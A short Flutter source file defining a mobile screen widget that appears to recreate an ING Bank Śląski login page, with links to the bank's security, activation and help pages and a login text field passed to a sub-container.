import 'package:flutter/material.dart';
import 'package:slaski/presentation/homepage/sub_container.dart';

class MobileScreen extends StatefulWidget {
  const MobileScreen( {super.key});

  @override
  State<MobileScreen> createState() => _MobileScreenState();
}

class _MobileScreenState extends State<MobileScreen> {
    final Uri lock = Uri.parse(
        'https://www.ing.pl/indywidualni/bankowosc-internetowa/bezpieczenstwo');
    final Uri key =
        Uri.parse('https://www.ing.pl/indywidualni/odnosniki/aktywacja');
    final Uri urk = Uri.parse(
        'https://www.ing.pl/indywidualni/bankowosc-internetowa/centrum-pomocy');
    final Uri url = Uri.parse(
        'https://www.ing.pl/aktualnosci/bankowosc-elektroniczna?news_id=1105917-oszusci-wysylaja-mejle-podszywajace-sie-pod-bank?src=login');
    final GlobalKey<FormState> formKey = GlobalKey<FormState>();
    final TextEditingController loginController = TextEditingController();
  @override
  Widget build(BuildContext context) {
    return  Container(color: Colors.white.withOpacity(0.1),child: 
    SingleChildScrollView(
      physics:const BouncingScrollPhysics(),
      child: Column(
        children: [
          SubContainer(formKey: formKey, loginController: loginController, urk: urk,url: url)
        ],
      ),
    ),);
  }
}